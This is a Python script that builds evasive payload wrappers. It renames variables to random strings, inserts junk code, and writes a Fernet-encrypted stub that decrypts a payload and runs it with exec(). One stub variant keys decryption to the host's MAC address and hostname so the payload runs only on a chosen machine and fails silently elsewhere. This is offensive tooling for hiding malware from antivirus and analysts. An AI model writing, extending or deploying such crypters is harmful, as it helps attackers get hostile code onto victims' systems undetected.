import random
import string

def generate_random_string(length=8):
    """Generates a random alphanumeric string."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def insert_junk_code(code_lines):
    """Inserts meaningless junk code into a list of code lines."""
    new_lines = []
    for line in code_lines:
        new_lines.append(line)
        if random.random() < 0.3: # 30% chance to insert junk
            junk_var = generate_random_string()
            junk_val = random.randint(100, 1000)
            new_lines.append(f"    {junk_var} = {junk_val} * {random.randint(1,10)}")
    return new_lines

def obfuscate_variables(code, variables):
    """Replaces variable names with random strings."""
    mapping = {var: generate_random_string() for var in variables}
    for old_name, new_name in mapping.items():
        code = code.replace(old_name, new_name)
    return code

def reorder_functions(functions):
    """Randomly reorders a list of function definitions."""
    random.shuffle(functions)
    return functions

def create_polymorphic_payload(base_payload_code):
    """
    Applies various obfuscation techniques to a base payload.
    (This is a simplified demonstration)
    """
    # In a real scenario, you'd parse the code into an AST (Abstract Syntax Tree)
    # to do this robustly. For now, we'll use string replacement for demonstration.

    # 1. Obfuscate variable names
    # (Assuming we know the variable names in the base payload)
    variables_to_obfuscate = ["my_socket", "data_to_send"] # Example
    obfuscated_code = obfuscate_variables(base_payload_code, variables_to_obfuscate)

    # 2. Insert junk code
    lines = obfuscated_code.split('\n')
    lines_with_junk = insert_junk_code(lines)

    # 3. Reorder functions (if the payload has multiple functions)
    # This part is more complex and would require parsing the code to identify
    # function blocks. We'll skip the implementation for this demo.

    final_code = "\n".join(lines_with_junk)

    return final_code

from cryptography.fernet import Fernet

def generate_encryption_stub(payload, ekp_key=None):
    """
    Generates a dynamic Python script that contains an encrypted payload
    and a decryption stub. Can be environment-keyed.
    """
    key = ekp_key or Fernet.generate_key()
    fernet = Fernet(key)
    encrypted_payload = fernet.encrypt(payload)

    # Generate random names for variables
    key_var = generate_random_string()
    encrypted_var = generate_random_string()
    # ... and so on

    if ekp_key:
        # If an EKP key is used, the stub needs to derive the key at runtime
        stub = f"""
# EKP-enabled stub
import platform, subprocess, json, hashlib, base64, uuid
from cryptography.fernet import Fernet

def get_current_profile_key():
    # This logic must match the profiler.py script
    try:
        mac = ':'.join(['{{:02x}}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        hostname = platform.node()
        # ... other profile elements
        key_material = str(mac) + str(hostname) # Simplified for demo
        hashed = hashlib.sha256(key_material.encode()).digest()
        return base64.urlsafe_b64encode(hashed)
    except Exception:
        return None

encrypted_payload = {encrypted_payload}
derived_key = get_current_profile_key()

if derived_key:
    try:
        f = Fernet(derived_key)
        decrypted_payload = f.decrypt(encrypted_payload)
        exec(decrypted_payload)
    except Exception:
        pass # Key is wrong, payload remains inert
"""
    else:
        # Standard, non-keyed stub
        stub = f"""
# Standard stub
from cryptography.fernet import Fernet
key = {key}
encrypted_payload = {encrypted_payload}
try:
    f = Fernet(key)
    decrypted_payload = f.decrypt(encrypted_payload)
    exec(decrypted_payload)
except Exception:
    pass
"""
    return stub